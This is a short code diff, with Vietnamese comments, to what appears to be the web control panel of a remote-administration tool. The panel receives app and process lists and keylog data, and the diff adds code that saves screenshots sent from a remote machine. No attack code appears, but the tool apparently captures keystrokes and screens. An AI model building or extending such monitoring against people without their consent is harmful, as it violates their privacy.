@@ -391,6 +391,30 @@ namespace client
                 else if(d.startsWith('LIST_APPS|')) renderList(d.substring(10), 'list-apps', 'appPidStop', 'appNameStart');
                 else if(d.startsWith('LIST_PROCS|')) renderList(d.substring(11), 'list-procs', 'procPidStop', 'procNameStart');
                 else if(d.startsWith('KEYLOG|')) log(d.substring(7));
+                else if (d.startsWith(""SCREENSHOT|"")) {
+                    let base64 = d.substring(""SCREENSHOT|"".length);
+
+                    // Chuyển base64 → blob
+                    let byteChars = atob(base64);
+                    let byteNumbers = new Array(byteChars.length);
+                    for (let i = 0; i < byteChars.length; i++) {
+                        byteNumbers[i] = byteChars.charCodeAt(i);
+                    }
+
+                    let byteArray = new Uint8Array(byteNumbers);
+                    let blob = new Blob([byteArray], { type: ""image/jpeg"" });
+
+                    // Tạo link download
+                    let url = URL.createObjectURL(blob);
+                    let a = document.createElement(""a"");
+                    a.href = url;
+                    a.download = ""screenshot_"" + Date.now() + "".jpg"";
+                    document.body.appendChild(a);
+                    a.click();
+                    document.body.removeChild(a);
+
+                    URL.revokeObjectURL(url);
+                }
                 else log(d);
             };
             ws.onclose = function() {
